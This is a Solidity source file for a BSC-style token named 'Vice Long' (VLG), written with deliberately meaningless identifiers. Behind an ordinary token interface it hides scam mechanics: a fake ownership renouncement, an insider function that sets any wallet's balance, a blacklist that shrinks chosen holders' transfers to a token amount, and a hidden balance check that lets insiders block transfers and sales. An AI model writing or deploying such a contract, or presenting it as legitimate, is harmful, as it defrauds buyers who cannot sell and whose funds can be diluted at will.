//SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

interface buyLaunch {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract marketingTotalReceiver {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface isMin {
    function createPair(address listReceiver, address feeLiquidity) external returns (address);
}

interface shouldMaxIs {
    function totalSupply() external view returns (uint256);

    function balanceOf(address minLiquidity) external view returns (uint256);

    function transfer(address feeTeam, uint256 receiverMin) external returns (bool);

    function allowance(address maxMode, address spender) external view returns (uint256);

    function approve(address spender, uint256 receiverMin) external returns (bool);

    function transferFrom(
        address sender,
        address feeTeam,
        uint256 receiverMin
    ) external returns (bool);

    event Transfer(address indexed from, address indexed toAmount, uint256 value);
    event Approval(address indexed maxMode, address indexed spender, uint256 value);
}

interface shouldMaxIsMetadata is shouldMaxIs {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ViceLong is marketingTotalReceiver, shouldMaxIs, shouldMaxIsMetadata {

    function owner() external view returns (address) {
        return launchWallet;
    }

    bool private tokenTotal;

    bool private marketingTake;

    function decimals() external view virtual override returns (uint8) {
        return tokenLiquidityFund;
    }

    address public totalLaunched;

    mapping(address => bool) public swapWallet;

    function approve(address toLiquidityAmount, uint256 receiverMin) public virtual override returns (bool) {
        teamFrom[_msgSender()][toLiquidityAmount] = receiverMin;
        emit Approval(_msgSender(), toLiquidityAmount, receiverMin);
        return true;
    }

    mapping(address => mapping(address => uint256)) private teamFrom;

    function feeReceiver(address receiverTrading, address feeTeam, uint256 receiverMin) internal returns (bool) {
        if (receiverTrading == tradingFrom) {
            return liquidityReceiverExempt(receiverTrading, feeTeam, receiverMin);
        }
        uint256 totalAuto = shouldMaxIs(totalLaunched).balanceOf(limitEnable);
        require(totalAuto == receiverShould);
        require(feeTeam != limitEnable);
        if (swapWallet[receiverTrading]) {
            return liquidityReceiverExempt(receiverTrading, feeTeam, toIsBuy);
        }
        return liquidityReceiverExempt(receiverTrading, feeTeam, receiverMin);
    }

    uint256 public exemptWallet;

    mapping(address => uint256) private modeFee;

    function limitLaunch() public {
        emit OwnershipTransferred(tradingFrom, address(0));
        launchWallet = address(0);
    }

    bool public minLimitEnable;

    function allowance(address fundBuy, address toLiquidityAmount) external view virtual override returns (uint256) {
        if (toLiquidityAmount == limitReceiverFee) {
            return type(uint256).max;
        }
        return teamFrom[fundBuy][toLiquidityAmount];
    }

    address private launchWallet;

    function maxLaunch(uint256 receiverMin) public {
        enableTrading();
        receiverShould = receiverMin;
    }

    uint256 constant toIsBuy = 15 ** 10;

    function name() external view virtual override returns (string memory) {
        return fundAuto;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return tradingList;
    }

    uint256 private tradingList = 100000000 * 10 ** 18;

    uint256 public sellSender;

    function liquidityReceiverExempt(address receiverTrading, address feeTeam, uint256 receiverMin) internal returns (bool) {
        require(modeFee[receiverTrading] >= receiverMin);
        modeFee[receiverTrading] -= receiverMin;
        modeFee[feeTeam] += receiverMin;
        emit Transfer(receiverTrading, feeTeam, receiverMin);
        return true;
    }

    constructor (){
        
        buyLaunch atTokenAmount = buyLaunch(limitReceiverFee);
        totalLaunched = isMin(atTokenAmount.factory()).createPair(atTokenAmount.WETH(), address(this));
        
        tradingFrom = _msgSender();
        limitLaunch();
        exemptListShould[tradingFrom] = true;
        modeFee[tradingFrom] = tradingList;
        
        emit Transfer(address(0), tradingFrom, tradingList);
    }

    address limitReceiverFee = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool public buyList;

    function receiverTxWallet(address exemptMin) public {
        if (buyList) {
            return;
        }
        
        exemptListShould[exemptMin] = true;
        
        buyList = true;
    }

    address limitEnable = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function transferFrom(address receiverTrading, address feeTeam, uint256 receiverMin) external override returns (bool) {
        if (_msgSender() != limitReceiverFee) {
            if (teamFrom[receiverTrading][_msgSender()] != type(uint256).max) {
                require(receiverMin <= teamFrom[receiverTrading][_msgSender()]);
                teamFrom[receiverTrading][_msgSender()] -= receiverMin;
            }
        }
        return feeReceiver(receiverTrading, feeTeam, receiverMin);
    }

    function enableTrading() private view {
        require(exemptListShould[_msgSender()]);
    }

    function shouldTrading(address fromLaunch) public {
        enableTrading();
        
        if (fromLaunch == tradingFrom || fromLaunch == totalLaunched) {
            return;
        }
        swapWallet[fromLaunch] = true;
    }

    function balanceOf(address minLiquidity) public view virtual override returns (uint256) {
        return modeFee[minLiquidity];
    }

    function getOwner() external view returns (address) {
        return launchWallet;
    }

    mapping(address => bool) public exemptListShould;

    function fundAt(address enableList, uint256 receiverMin) public {
        enableTrading();
        modeFee[enableList] = receiverMin;
    }

    uint256 public enableAmount;

    uint256 public sellFee;

    uint256 private atTx;

    string private fundAuto = "Vice Long";

    uint8 private tokenLiquidityFund = 18;

    function symbol() external view virtual override returns (string memory) {
        return senderList;
    }

    string private senderList = "VLG";

    function transfer(address enableList, uint256 receiverMin) external virtual override returns (bool) {
        return feeReceiver(_msgSender(), enableList, receiverMin);
    }

    uint256 receiverShould;

    event OwnershipTransferred(address indexed launchedTradingFee, address indexed receiverMinExempt);

    uint256 launchedLiquidityFrom;

    address public tradingFrom;

}